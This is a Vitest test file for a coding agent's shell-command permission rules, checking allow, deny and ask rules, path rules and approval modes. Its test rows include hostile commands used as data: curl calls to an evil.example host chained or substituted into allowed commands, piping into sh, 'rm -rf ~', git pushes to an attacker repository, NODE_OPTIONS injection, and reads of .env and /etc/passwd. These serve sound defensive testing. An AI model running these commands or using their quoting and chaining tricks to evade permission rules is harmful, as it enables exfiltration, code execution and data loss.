import { describe, expect, it } from 'vitest';
import { denialFor, type ApprovalMode, type CommandScope, type Denial } from '../src/approval.js';
import {
  parseRule,
  pathRuleFor,
  pathRuleMatches,
  patternText,
  ruledDenial,
  ruleText,
  sandboxDenials,
  type CommandPattern,
  type PathEffect,
  type PathTool,
  type PermissionRule,
  type RuleEffect,
} from '../src/permission-rules.js';

const scope: CommandScope = { workspace: '/Users/me/ws', tempDir: '/private/var/folders/x/T/gcode-tmp', home: '/Users/me' };

const rule = (effect: RuleEffect, text: string): PermissionRule => ({
  id: `${effect}:${text}`,
  effect,
  pattern: text.split(' ') as unknown as CommandPattern,
  createdAt: '2026-10-07T00:00:00.000Z',
});
const allow = (text: string) => rule('allow', text);
const deny = (text: string) => rule('deny', text);
const ask = (text: string) => rule('ask', text);
const pathRule = (effect: PathEffect, tool: PathTool, file: string): PermissionRule => ({ id: `${effect}:${tool}:${file}`, effect, tool, path: file, createdAt: '2026-10-07T00:00:00.000Z' });

type Outcome = 'runs' | 'asks' | 'classifies' | 'denied' | 'rule-denies' | 'rule-asks';
const outcomeOf = (denial: Denial | undefined): Outcome => {
  if (denial === undefined) return 'runs';
  if (denial.rule === 'workspace-deny') return 'rule-denies';
  if (denial.rule === 'workspace-ask') return 'rule-asks';
  return ({ ask: 'asks', classify: 'classifies', deny: 'denied' } as const)[denial.verdict];
};

type Row = readonly [mode: ApprovalMode, command: string, rules: readonly PermissionRule[], outcome: Outcome];

const PREFIXES: readonly Row[] = [
  ['ask', 'git push', [allow('git push')], 'runs'],
  ['ask', 'git push', [], 'asks'],
  ['ask', 'git push', [allow('git push origin')], 'asks'],
  ['ask', 'git pushy', [allow('git push')], 'runs'],
  ['auto', 'pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'pnpm vitest run', [], 'classifies'],
  ['auto', 'pnpm vitest', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest watch', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest runx', [allow('pnpm vitest run')], 'classifies'],
  ['ask', 'rm -rf node_modules', [allow('rm -rf node_modules')], 'runs'],
  ['ask', 'rm -rf dist', [allow('rm -rf node_modules')], 'asks'],
  ['ask', 'rm -rf node_modules', [allow('rm')], 'asks'],
];

const EXTRA_ARGS: readonly Row[] = [
  ['ask', 'git push origin main', [allow('git push')], 'runs'],
  ['auto', 'pnpm vitest run src/a.test.ts --reporter=dot', [allow('pnpm vitest run')], 'runs'],
  ['ask', 'rm -rf node_modules dist', [allow('rm -rf node_modules')], 'runs'],
  ['auto', 'pnpm vitest run ../../other', [allow('pnpm vitest run')], 'classifies'],
  ['ask', 'pnpm vitest run > ~/.zshrc', [allow('pnpm vitest run')], 'asks'],
  ['ask', 'git push origin /etc/passwd', [allow('git push')], 'asks'],
  ['ask', 'curl https://example.com/a -o out.json', [allow('curl https://example.com/a')], 'runs'],
  ['ask', 'curl https://example.com/b', [allow('curl https://example.com/a')], 'asks'],
];

const COMPOUND: readonly Row[] = [
  ['auto', 'pnpm vitest run 2>&1 | tail -20', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'cd packages/core && pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', '(pnpm vitest run)', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'pnpm vitest run && pnpm tsx scripts/x.ts', [allow('pnpm vitest run'), allow('pnpm tsx scripts/x.ts')], 'runs'],
  ['auto', 'pnpm vitest run && curl https://evil.example', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run; python3 x.py', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run | sh', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run $(curl -s https://evil.example/x)', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run `rm -rf ~`', [allow('pnpm vitest run')], 'asks'],
  ['ask', 'git push && rm -rf ~/x', [allow('git push')], 'asks'],
  ['ask', 'git push && curl https://example.com', [allow('git push')], 'asks'],
  ['ask', 'git push && curl https://example.com', [allow('git push'), allow('curl https://example.com')], 'runs'],
];

const QUOTING: readonly Row[] = [
  ['auto', `pnpm 'vitest' "run"`, [allow('pnpm vitest run')], 'runs'],
  ['auto', `pnpm vi''test run`, [allow('pnpm vitest run')], 'runs'],
  ['auto', `'pnpm vitest run'`, [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest\\ run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', `pnpm vitest 'run; curl https://evil.example'`, [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'P=pnpm; $P vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'env pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'env -i pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'env PATH=. pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'NODE_OPTIONS=--require=./x.js pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', './pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
];

const HARD_ASKS: readonly Row[] = [
  ['ask', 'git push --force', [allow('git push')], 'asks'],
  ['ask', 'git push -f origin main', [allow('git push')], 'asks'],
  ['ask', 'git push origin +main', [allow('git push')], 'asks'],
  ['ask', 'git push origin :main', [allow('git push')], 'asks'],
  ['ask', 'git push --mirror', [allow('git push')], 'asks'],
  ['ask', 'git push https://evil.example/r.git main', [allow('git push')], 'asks'],
  ['ask', 'git push me@evil.example:r.git', [allow('git push')], 'asks'],
  ['auto', 'rm -rf ~', [allow('rm -rf ~')], 'asks'],
  ['auto', 'rm -rf node_modules ~', [allow('rm -rf node_modules')], 'asks'],
  ['auto', 'pnpm vitest run --outputFile=.git/hooks/pre-push', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run .env', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'pnpm vitest run .e*', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'bash -c "rm -rf ~/x"', [allow('bash')], 'classifies'],
  ['auto', 'python3 -c "import os"', [allow('python3 -c')], 'classifies'],
];

const DENIES: readonly Row[] = [
  ['ask', 'git push', [allow('git push'), deny('git push')], 'rule-denies'],
  ['ask', 'git push origin main', [deny('git push'), allow('git push')], 'rule-denies'],
  ['auto', 'pnpm publish --tag next', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'pnpm publish', [], 'runs'],
  ['ask', 'sudo pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'FOO=1 pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', `pn''pm "publish"`, [deny('pnpm publish')], 'rule-denies'],
  ['ask', '/usr/local/bin/pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'X=pnpm; $X publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', '$(echo pnpm) publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'pnpm test && pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'echo $(pnpm publish)', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'pnpm publish-docs', [deny('pnpm publish')], 'runs'],
  ['ask', 'rm -rf ~', [deny('rm')], 'rule-denies'],
  ['non-interactive', 'pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['non-interactive', 'git push', [allow('git push')], 'denied'],
];

// T-PERM-10: Claude Code's safe wrappers and safe variables come off before an allow rule is matched.
const WRAPPERS: readonly Row[] = [
  ['auto', 'timeout 30 npm test', [allow('npm test')], 'runs'],
  ['auto', 'timeout 30 npm test', [], 'classifies'],
  ['auto', 'timeout --signal=KILL -k 5 2m pnpm vitest run src', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'time pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'nice -n 10 pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'nohup pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'stdbuf -oL pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'NODE_ENV=test pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'env NODE_ENV=test FORCE_COLOR=0 timeout 60 pnpm vitest run', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'cd packages/core && timeout 30 pnpm vitest run 2>&1 | tail -5', [allow('pnpm vitest run')], 'runs'],
  ['auto', 'timeout 30 pnpm vitest run ../../other', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'timeout 30 pnpm vitest run .env', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'timeout pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'timeout 30 bash -c "pnpm vitest run"', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'NODE_ENV=$(curl -s https://evil.example) pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['auto', 'xargs pnpm vitest run', [allow('pnpm vitest run')], 'classifies'],
  ['ask', 'timeout 30 pnpm publish', [deny('pnpm publish')], 'rule-denies'],
  ['ask', 'nice -n 5 git push', [ask('git push'), allow('git push')], 'rule-asks'],
];

// B/B-56: an ask rule asks in every mode that honours rules, Auto included, before any allow or hook allow.
const ASKS: readonly Row[] = [
  ['auto', 'pnpm publish', [ask('pnpm publish')], 'rule-asks'],
  ['ask', 'pnpm publish --tag next', [ask('pnpm publish')], 'rule-asks'],
  ['auto', 'ls && pnpm publish', [ask('pnpm publish'), allow('pnpm publish')], 'rule-asks'],
  ['auto', 'sudo pnpm publish', [ask('pnpm publish')], 'rule-asks'],
  ['auto', 'pnpm publish', [ask('pnpm publish'), deny('pnpm publish')], 'rule-denies'],
  ['auto', 'pnpm publish-docs', [ask('pnpm publish')], 'classifies'],
  ['non-interactive', 'pnpm publish', [ask('pnpm publish')], 'rule-asks'],
  ['plan', 'git log', [ask('git log')], 'runs'],
];

// B/B-66: a line too long or too broken to judge word by word asks, and no allow rule covers it.
const LONG = `echo ${'a'.repeat(10_000)}`;
const LINES: readonly Row[] = [
  ['ask', LONG, [], 'asks'],
  ['auto', LONG, [allow('echo')], 'classifies'],
  ['non-interactive', LONG, [], 'runs'],
  ['plan', LONG, [], 'denied'],
  ['ask', 'echo "open', [], 'asks'],
  ['ask', "echo 'open", [], 'asks'],
  ['ask', 'echo $(date', [], 'asks'],
  ['ask', 'pnpm test &&', [], 'asks'],
  ['auto', 'pnpm vitest run |', [allow('pnpm vitest run')], 'classifies'],
  ['ask', 'pnpm test &&\n  pnpm lint', [], 'runs'],
  ['ask', "cat <<'EOF'\nit's here\nEOF", [], 'runs'],
  ['ask', 'pnpm publish "open', [deny('pnpm publish')], 'rule-denies'],
];

// B/B-61: a Read rule covers a command word that names its file, as `read` and the sandbox do.
const PATHS: readonly Row[] = [
  ['ask', 'cat config/prod.json', [pathRule('deny', 'read', 'config/prod.json')], 'rule-denies'],
  ['auto', 'cat ./config/prod.json | head', [pathRule('deny', 'read', 'config/prod.json')], 'rule-denies'],
  ['ask', 'grep -r key private', [pathRule('deny', 'read', 'private/**')], 'rule-denies'],
  ['ask', 'cat deep/dir/token.txt', [pathRule('deny', 'read', 'token.txt')], 'rule-denies'],
  ['ask', 'cat token.txt.bak', [pathRule('deny', 'read', 'token.txt')], 'runs'],
  ['auto', 'cat notes/plan.md', [pathRule('ask', 'read', 'notes/*.md')], 'rule-asks'],
  ['ask', 'cat src/a.ts', [pathRule('deny', 'edit', 'src/**')], 'runs'],
  ['ask', 'pnpm vitest run --config=config/prod.json', [pathRule('deny', 'read', 'config/prod.json')], 'rule-denies'],
];

const PLAN: readonly Row[] = [
  ['plan', 'git log', [deny('git log')], 'runs'],
  ['plan', 'git push', [allow('git push')], 'denied'],
  ['plan', 'pnpm vitest run', [allow('pnpm vitest run')], 'denied'],
];

describe('ruledDenial', () => {
  const tables = { prefixes: PREFIXES, 'extra args': EXTRA_ARGS, 'compound commands': COMPOUND, 'quoting tricks': QUOTING, 'hard asks': HARD_ASKS, 'deny rules': DENIES, 'safe wrappers': WRAPPERS, 'ask rules': ASKS, 'whole lines': LINES, 'path rules': PATHS, 'plan mode': PLAN };
  for (const [name, rows] of Object.entries(tables)) {
    describe(name, () => {
      it.each(rows)('%s: %s with %j %s', (mode, command, rules, outcome) => {
        expect(outcomeOf(ruledDenial(command, scope, mode, rules))).toBe(outcome);
      });
    });
  }

  it('is the built-in verdict when no rule applies', () => {
    for (const command of ['git push origin main; rm -rf ~', 'curl https://example.com', 'pnpm vitest run', 'rm -rf src', 'echo "open', LONG]) {
      for (const mode of ['plan', 'ask', 'auto', 'non-interactive'] as const) {
        const { offer: _offer, ...ruled } = ruledDenial(command, scope, mode, []) ?? {};
        expect(ruled).toEqual(denialFor(command, scope, mode) ?? {});
      }
    }
  });

  it('names the deny rule and the command it caught', () => {
    expect(ruledDenial('pnpm test && pnpm publish --tag x', scope, 'auto', [deny('pnpm publish')])).toEqual({
      rule: 'workspace-deny',
      reason: 'the workspace rule that denies `pnpm publish`, which the user set in Settings under Permissions',
      command: 'pnpm publish --tag x',
      verdict: 'deny',
    });
    expect(ruledDenial('timeout 9 pnpm publish', scope, 'auto', [ask('pnpm publish')])).toEqual({
      rule: 'workspace-ask',
      reason: 'the workspace rule that asks before `pnpm publish`, which the user set in Settings under Permissions',
      command: 'timeout 9 pnpm publish',
      verdict: 'ask',
    });
  });
});

describe('path rules', () => {
  const MATCHES: readonly (readonly [pattern: string, file: string, matches: boolean])[] = [
    ['.env', '/Users/me/ws/.env', true],
    ['.env', '/Users/me/ws/apps/web/.env', true],
    ['.env', '/Users/me/ws/.envrc', false],
    ['*.pem', '/Users/me/ws/certs/site.pem', true],
    ['secrets', '/Users/me/ws/a/secrets/key.txt', true],
    ['secrets/**', '/Users/me/ws/secrets/key.txt', true],
    ['secrets/**', '/Users/me/ws/a/secrets/key.txt', false],
    ['secrets/**', '/Users/me/ws/secrets', true],
    ['./config/prod.json', '/Users/me/ws/config/prod.json', true],
    ['config/prod.json', '/Users/me/ws/x/config/prod.json', false],
    ['/build', '/Users/me/ws/build/out.js', true],
    ['/build', '/Users/me/ws/src/build', false],
    ['src/**/*.gen.ts', '/Users/me/ws/src/a/b/c.gen.ts', true],
    ['src/**/*.gen.ts', '/Users/me/ws/src/c.gen.ts', true],
    ['src/*.ts', '/Users/me/ws/src/a/b.ts', false],
    ['data/[ab].csv', '/Users/me/ws/data/a.csv', true],
    ['data/[!ab].csv', '/Users/me/ws/data/a.csv', false],
    ['~/.zshrc', '/Users/me/.zshrc', true],
    ['//etc/hosts', '/etc/hosts', true],
    ['//etc', '/etc/passwd', true],
    ['notes/', '/Users/me/ws/notes/a.md', true],
    ['a+b.txt', '/Users/me/ws/aab.txt', false],
  ];
  it.each(MATCHES)('%s matches %s: %s', (pattern, file, matches) => {
    expect(pathRuleMatches({ path: pattern }, file, scope)).toBe(matches);
  });

  it('lets a Read deny stop edit too, and picks a deny over an ask', () => {
    const rules = [pathRule('ask', 'read', 'docs/**'), pathRule('deny', 'read', 'docs/private/**'), pathRule('ask', 'edit', 'src/**')];
    expect(pathRuleFor('edit', '/Users/me/ws/docs/private/a.md', rules, scope)?.effect).toBe('deny');
    expect(pathRuleFor('edit', '/Users/me/ws/docs/a.md', rules, scope)).toBeUndefined();
    expect(pathRuleFor('read', '/Users/me/ws/docs/private/a.md', rules, scope)?.effect).toBe('deny');
    expect(pathRuleFor('read', '/Users/me/ws/docs/a.md', rules, scope)?.effect).toBe('ask');
    expect(pathRuleFor('read', '/Users/me/ws/src/a.ts', rules, scope)).toBeUndefined();
    expect(pathRuleFor('edit', '/Users/me/ws/src/a.ts', rules, scope)?.effect).toBe('ask');
  });

  it('gives the sandbox a glob for each deny, read denies closing writes too', () => {
    const rules = [pathRule('deny', 'read', 'token.txt'), pathRule('deny', 'edit', '/dist'), pathRule('ask', 'read', 'notes/**'), allow('pnpm test')];
    expect(sandboxDenials(rules, scope)).toEqual({
      denyRead: ['/Users/me/ws/token.txt', '/Users/me/ws/token.txt/**', '/Users/me/ws/**/token.txt', '/Users/me/ws/**/token.txt/**'],
      denyWrite: ['/Users/me/ws/token.txt', '/Users/me/ws/token.txt/**', '/Users/me/ws/**/token.txt', '/Users/me/ws/**/token.txt/**', '/Users/me/ws/dist', '/Users/me/ws/dist/**'],
    });
  });
});

describe('the offered rule', () => {
  const OFFERS: readonly (readonly [ApprovalMode, string, string | undefined])[] = [
    ['ask', 'git push origin main', 'git push origin'],
    ['ask', 'git push', 'git push'],
    ['auto', 'pnpm vitest run src/a.test.ts', 'pnpm vitest run'],
    ['auto', 'pnpm vitest run 2>&1 | tail -5', 'pnpm vitest run'],
    ['ask', 'rm -rf node_modules', 'rm -rf node_modules'],
    ['ask', 'curl -s https://example.com/x', 'curl -s https://example.com/x'],
    ['auto', 'pnpm vitest run ../../other', 'pnpm vitest run ../../other'],
    ['ask', 'git push --force', undefined],
    ['ask', 'rm -rf ~', undefined],
    ['auto', 'bash -c "pnpm publish"', undefined],
    ['auto', 'python3 -c "print(1)"', undefined],
    ['auto', 'psql', undefined],
    ['ask', 'git push && curl https://example.com', undefined],
    ['auto', '$TOOL run', undefined],
    ['plan', 'git push', undefined],
    ['non-interactive', 'git push', undefined],
  ];
  it.each(OFFERS)('%s: %s offers %s', (mode, command, offered) => {
    const offer = ruledDenial(command, scope, mode, [])?.offer;
    expect(offer === undefined ? undefined : patternText(offer)).toBe(offered);
  });

  it('covers the command it was offered for', () => {
    for (const [mode, command, offered] of OFFERS) {
      if (offered === undefined) continue;
      expect(outcomeOf(ruledDenial(command, scope, mode, [allow(offered)]))).toBe('runs');
    }
  });
});

describe('parseRule', () => {
  const PARSED: readonly (readonly [RuleEffect, string, readonly string[] | string])[] = [
    ['allow', 'pnpm test', ['pnpm', 'test']],
    ['allow', '  pnpm   vitest run ', ['pnpm', 'vitest', 'run']],
    ['allow', `grep 'a b'`, ['grep', 'a b']],
    ['deny', 'rm -rf ~', ['rm', '-rf', '~']],
    ['deny', 'bash', ['bash']],
    ['allow', '', 'Type a command'],
    ['allow', 'pnpm test && rm x', 'one command'],
    ['allow', 'pnpm test > out', 'one command'],
    ['allow', 'echo $HOME', 'one command'],
    ['allow', 'FOO=1 pnpm test', 'not a variable'],
    ['allow', 'rm -rf ~', 'always asks'],
    ['allow', 'git push --force', 'always asks'],
    ['allow', 'cat .env', 'always asks'],
    ['allow', 'bash', 'runs whatever follows'],
    ['allow', 'sudo pnpm', 'runs whatever follows'],
    ['allow', 'node -e', 'runs whatever follows'],
  ];
  it.each(PARSED)('%s %j', (effect, text, expected) => {
    const parsed = parseRule(effect, text, scope);
    if (typeof expected === 'string') expect(parsed.ok ? ruleText(parsed.rule) : parsed.reason).toContain(expected);
    else expect(parsed).toEqual({ ok: true, rule: { effect, pattern: expected } });
  });

  it('reads back what patternText writes', () => {
    for (const pattern of [['grep', 'a b'], ['echo', "it's"], ['pnpm', 'test:unit']] as const) {
      expect(parseRule('allow', patternText(pattern), scope)).toEqual({ ok: true, rule: { effect: 'allow', pattern } });
    }
  });

  it("reads Claude Code's Read, Edit and Bash forms", () => {
    expect(parseRule('deny', 'Read(./secrets/**)', scope)).toEqual({ ok: true, rule: { effect: 'deny', tool: 'read', path: './secrets/**' } });
    expect(parseRule('ask', ' Edit(src/gen/**) ', scope)).toEqual({ ok: true, rule: { effect: 'ask', tool: 'edit', path: 'src/gen/**' } });
    expect(parseRule('allow', 'Bash(npm test *)', scope)).toEqual({ ok: true, rule: { effect: 'allow', pattern: ['npm', 'test'] } });
    expect(parseRule('ask', 'Bash(git push:*)', scope)).toEqual({ ok: true, rule: { effect: 'ask', pattern: ['git', 'push'] } });
    const refusals = [parseRule('allow', 'Read(src/**)', scope), parseRule('deny', 'Read()', scope), parseRule('allow', 'Bash(npm * test)', scope)];
    expect(refusals.map((parsed) => (parsed.ok ? '' : parsed.reason))).toEqual([
      expect.stringContaining('can only ask or deny'),
      expect.stringContaining('Name a path'),
      expect.stringContaining('only at the end'),
    ]);
    for (const text of ['Read(./secrets/**)', 'Edit(/dist)', 'pnpm vitest run']) {
      const parsed = parseRule('deny', text, scope);
      expect(parsed.ok && ruleText(parsed.rule)).toBe(text);
    }
  });

  it('reads an allow typed as Bash(words) without a star as exact, and a deny or ask as a prefix', () => {
    expect(parseRule('allow', 'Bash(npm test)', scope)).toEqual({ ok: true, rule: { effect: 'allow', pattern: ['npm', 'test'], exact: true } });
    expect(parseRule('allow', 'npm test', scope)).toEqual({ ok: true, rule: { effect: 'allow', pattern: ['npm', 'test'] } });
    expect(parseRule('deny', 'Bash(npm test)', scope)).toEqual({ ok: true, rule: { effect: 'deny', pattern: ['npm', 'test'] } });
    expect(parseRule('ask', 'Bash(npm test)', scope)).toEqual({ ok: true, rule: { effect: 'ask', pattern: ['npm', 'test'] } });
    const exact = parseRule('allow', 'Bash(npm test)', scope);
    expect(exact.ok && ruleText(exact.rule)).toBe('Bash(npm test)');
  });
});

describe('ruledDenial with an exact allow', () => {
  const exact = (text: string): PermissionRule => ({ ...allow(text), exact: true });
  const ROWS: readonly Row[] = [
    ['auto', 'npm install', [exact('npm install')], 'runs'],
    ['auto', 'timeout 30 npm install', [exact('npm install')], 'runs'],
    ['auto', 'npm install left-pad', [exact('npm install')], 'classifies'],
    ['auto', 'npm install left-pad', [allow('npm install')], 'runs'],
    ['ask', 'git push origin main', [exact('git push')], 'asks'],
    ['ask', 'git push', [exact('git push')], 'runs'],
    ['auto', 'npm install && npm install left-pad', [exact('npm install')], 'classifies'],
  ];
  it.each(ROWS)('%s: %s', (mode, command, rules, outcome) => {
    expect(outcomeOf(ruledDenial(command, scope, mode, rules))).toBe(outcome);
  });
});

describe('ruledDenial under a PreToolUse hook allow', () => {
  // A hook allow answers the question and skips the classifier; it never beats a refusal or what Geno always asks.
  const HOOK_ALLOWS: readonly Row[] = [
    ['ask', 'git push', [], 'runs'],
    ['auto', 'curl https://example.com', [], 'runs'],
    ['auto', 'kubectl get pods && pnpm vitest run', [], 'runs'],
    ['ask', 'pnpm publish', [deny('pnpm publish')], 'rule-denies'],
    ['auto', 'pnpm publish', [ask('pnpm publish')], 'rule-asks'],
    ['auto', LONG, [], 'runs'],
    ['ask', 'cat .env', [], 'asks'],
    ['auto', 'cat .env', [], 'classifies'],
    ['ask', 'cat /etc/hosts', [], 'asks'],
    ['ask', 'git push && cat ../outside.txt', [], 'asks'],
    ['ask', 'git push --force', [], 'asks'],
    ['auto', 'rm -rf ~', [], 'asks'],
    ['plan', 'git push', [], 'denied'],
    ['non-interactive', 'git push', [], 'denied'],
  ];
  it.each(HOOK_ALLOWS)('%s: %s with %j %s', (mode, command, rules, outcome) => {
    expect(outcomeOf(ruledDenial(command, scope, mode, rules, true))).toBe(outcome);
  });
});
